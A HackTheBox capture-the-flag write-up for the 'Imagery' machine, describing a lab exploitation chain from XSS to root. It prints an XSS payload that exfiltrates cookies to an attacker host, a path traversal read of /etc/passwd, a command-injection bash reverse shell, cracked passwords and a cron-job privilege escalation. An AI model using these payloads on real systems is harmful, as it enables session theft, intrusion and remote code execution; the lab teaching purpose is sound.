---
title: "HackTheBox: Imagery Writeup"
date: "2025-10-31"
platform: "HackTheBox"
category: "Web Application"
difficulty: "Medium"
tags: ["XSS", "Path Traversal", "Command Injection", "Privilege Escalation", "Cookie Theft", "MD5 Cracking"]
excerpt: "Complete web application exploitation chain from XSS-based cookie theft to root access through path traversal, command injection, and privilege escalation via scheduled tasks"
readingTime: 20
featured: true
---

# HackTheBox: Imagery Writeup

## Overview

Imagery is a Medium-difficulty machine on HackTheBox that showcases a realistic web application exploitation chain. The attack path involves stealing admin credentials through XSS, exploiting path traversal to read sensitive files, leveraging command injection for initial shell access, and escalating privileges through encrypted backups and scheduled task manipulation.

## Reconnaissance & Initial Access

### User Registration and Login

The machine presents a web application with login and registration functionality. After creating an account and logging in, we discover several key features:

- An image upload page
- A bug report functionality
- Administrative features (after gaining access)

Initial attempts to exploit the upload functionality prove unsuccessful, shifting our focus to the bug report page.

## Phase 1: XSS Attack - Admin Cookie Theft

### Setting Up the Listener

To capture the admin's session cookie, we set up a simple Python HTTP server:

```bash
python -m http.server 1337
```

### Crafting the XSS Payload

The bug report page is vulnerable to XSS attacks. We submit the following payload designed to steal the admin's cookie:

```html
"><img src=x onerror=fetch('http://10.10.14.60:1337/'+btoa(document.cookie))>
```

**How it works:**
- The payload injects an image tag with an invalid source
- When the image fails to load, the `onerror` event triggers
- The JavaScript fetches our server, sending the base64-encoded cookie in the URL

![XSS Payload Submission](1.png)

### Capturing and Decoding the Session

After the admin views our bug report, we receive the base64-encoded session cookie:

![Captured Cookie](2.png)

We decode the cookie to obtain the session value:

```bash
echo "c2Vzc2lvbj0uZUp3OWpiRU9nekFNUlBfRmM0VUVaY3BFUjc0aU1vbExMU1VHeGM2QUVQLU9vcW9kNzkzVDNRbVJkVTk0ekJFY1lMOE00UmxIZUFEcksyWVdjRllxdGVnNTcxUjBFelNXMVJ1cFZhVUM3bzFKdjhhUGVReGhxMkxfcmtIQlRPMmlyVTZjY2FWeWRCOWI0TG9CS3JNdjJ3LmFOa1I4US5zdF9yNFhqUElCTlRvTkZVcmdCN1M1TzVsSU0=" | base64 -d
```

![Decoded Session](3.png)

## Phase 2: Path Traversal - Admin Panel Exploitation

### Accessing the Admin Panel

Using the stolen session cookie, we gain access to the administrative panel. A particularly interesting feature is the system log download functionality.

### Exploiting Path Traversal

The log download feature is vulnerable to path traversal attacks. We can read arbitrary files on the system:

```bash
http://10.10.11.88:8000/admin/get_system_log?log_identifier=../../../../etc/passwd
```

### Enumerating System Users

The `/etc/passwd` file reveals several interesting users with shell access:

```
web:x:1001:1001::/home/web:/bin/bash
mark:x:1002:1002::/home/mark:/bin/bash
```

These users become our targets for lateral movement.

## Phase 3: Database Discovery & Credential Cracking

### Finding the Database

Through path traversal, we discover a `db.json` file containing user credentials with MD5-hashed passwords.

### Cracking the Hash

We successfully crack the MD5 hash for `testuser@imagery.htb`:

**Discovered Credentials:**
- **Username:** `testuser@imagery.htb`
- **Password:** `iambatman`

## Phase 4: Command Injection - Initial Shell Access

### Identifying the Vulnerability

The image transformation functionality accepts parameters for cropping and resizing images. Testing reveals that the `height` parameter is vulnerable to command injection.

### Setting Up the Reverse Shell

First, we start a netcat listener:

```bash
nc -lnvp 4443
```

### Exploiting with Burp Suite

We intercept the image transformation request in Burp Suite and inject our payload into the `height` parameter:

```json
{
  "imageId": "[image-id]",
  "transformType": "crop",
  "params": {
    "x": 0,
    "y": 0,
    "width": 1922,
    "height": "100; bash -c \"bash -i >& /dev/tcp/10.10.14.60/4433 0>&1\" #"
  }
}
```

**Result:** We successfully obtain a reverse shell as the `web` user!

## Phase 5: Lateral Movement - Web to Mark

### Discovering the Encrypted Backup

While exploring the system, we find an AES-encrypted backup file in `/var/backup`.

### Decrypting the Backup

We use a specialized AES decryption tool:

```bash
git clone https://github.com/Nabeelcn25/dpyAesCrypt.py.git
# Decrypt the backup file using the tool
```

### Extracting Mark's Credentials

Inside the decrypted backup, we find another `db.json` file containing Mark's password hash:

- **Hash:** `01c3d2e5bdaf6134cec0a367cf53e535`
- **Cracked Password:** `supersmash`

**Mark's Credentials:**
- **Username:** `mark`
- **Password:** `supersmash`

We can now SSH or switch to Mark's account.

## Phase 6: Privilege Escalation - Root Access

### Checking Sudo Privileges

As Mark, we check our sudo permissions:

```bash
sudo -l
```

We discover the ability to run `charcol`, a custom scheduled task manager.

### Exploiting Scheduled Tasks

We leverage the scheduled task functionality to read the root flag. First, we configure the service if necessary, then create a malicious cron job:

```bash
auto add --schedule "*/1 * * * *" --command "cat /root/root.txt >> /tmp/flag.txt" --name "TestTimestamp" --log-output /tmp/root.txt
```

**What this does:**
- Schedules a task to run every minute (`*/1 * * * *`)
- Executes as root due to sudo privileges
- Reads `/root/root.txt` and appends it to `/tmp/flag.txt`
- Logs the output to `/tmp/root.txt`

### Retrieving the Root Flag

After waiting for the scheduled task to execute:

```bash
cat /tmp/root.txt
```

**Root Flag:** `44ad9ef71a4f239274a95c6bf7b43eab`
s